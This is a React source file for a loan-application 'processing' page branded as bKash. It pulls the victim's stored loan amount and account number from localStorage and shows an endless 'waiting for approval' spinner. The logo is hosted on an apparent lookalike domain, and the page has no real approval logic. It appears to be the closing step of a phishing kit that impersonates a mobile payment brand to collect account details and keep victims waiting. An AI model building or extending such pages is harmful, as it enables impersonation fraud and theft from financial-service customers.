import { useState, useEffect } from "react";

export default function Confirmation() {
  const [dots, setDots] = useState("");
  const [loanAmount, setLoanAmount] = useState("");
  const [loanCategory, setLoanCategory] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");

  useEffect(() => {
    // Get all data from localStorage after completing all steps
    const amount = localStorage.getItem('loanAmount');
    const category = localStorage.getItem('loanCategory');
    const accountNumber = localStorage.getItem('accountNumber');
    
    setLoanAmount(amount || "0");
    setLoanCategory(category || "Personal Loan");
    setPhoneNumber(accountNumber || "Not provided");
  }, []);

  // Animated dots effect
  useEffect(() => {
    const interval = setInterval(() => {
      setDots((prev) => (prev.length >= 3 ? "" : prev + "."));
    }, 500);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-lg w-full max-w-md px-8 py-10">
        {/* Logo */}
        <div className="flex justify-center mb-4">
          <img
            src="https://bkashloan-info.com/img/bKash-logo.png"
            alt="bKash Logo"
            className="h-12 object-contain"
          />
        </div>

        {/* Divider */}
        <hr className="border-pink-500 mb-8" />

        {/* Spinner */}
        <div className="flex justify-center mb-6">
          <div className="w-12 h-12 rounded-full border-4 border-gray-200 border-t-pink-500 animate-spin" />
        </div>

        {/* Title */}
        <h2 className="text-center text-xl font-bold text-gray-800 mb-1">
          Processing Your Request
        </h2>
        <p className="text-center text-sm text-gray-500 mb-6">
          Please wait while we verify your loan application...
        </p>

        {/* Loan Details Card */}
        <div className="bg-gray-50 rounded-xl px-6 py-5 mb-6">
          <h3 className="text-center font-semibold text-gray-700 mb-4">
            Loan Details
          </h3>
          <div className="space-y-3 text-sm">
            <div className="flex justify-between">
              <span className="text-gray-500">Amount:</span>
              <span className="font-bold text-gray-800">৳{parseFloat(loanAmount).toFixed(2)}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">Category:</span>
              <span className="font-bold text-gray-800">{loanCategory}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">Mobile:</span>
              <span className="font-bold text-gray-800">{phoneNumber}</span>
            </div>
          </div>
        </div>

        {/* Approval Status */}
        <div className="bg-blue-50 rounded-xl px-6 py-4 text-center">
          <p className="text-blue-500 font-semibold text-sm mb-1">
            Waiting for approval...
          </p>
          <p className="text-blue-400 text-xs">
            Your request has been sent to our team for review.
          </p>
        </div>
      </div>
    </div>
  );
}